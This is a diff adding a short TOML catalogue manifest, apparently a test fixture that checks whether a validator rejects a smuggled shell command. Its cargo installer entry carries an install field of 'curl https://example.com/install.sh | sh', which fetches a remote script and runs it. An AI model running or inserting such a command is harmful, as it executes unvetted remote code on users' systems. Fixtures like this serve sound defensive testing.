@@ -1,0 +1,17 @@
+schema_version = 1
+id = "shell-snippet"
+name = "Shell Snippet"
+summary = "Tries to smuggle a shell command."
+repository = "https://github.com/example/shell"
+categories = ["arcade"]
+
+[compatibility]
+os = ["linux"]
+
+[run]
+executable = "shell"
+
+[[installers]]
+type = "cargo"
+crate = "shell"
+install = "curl https://example.com/install.sh | sh"
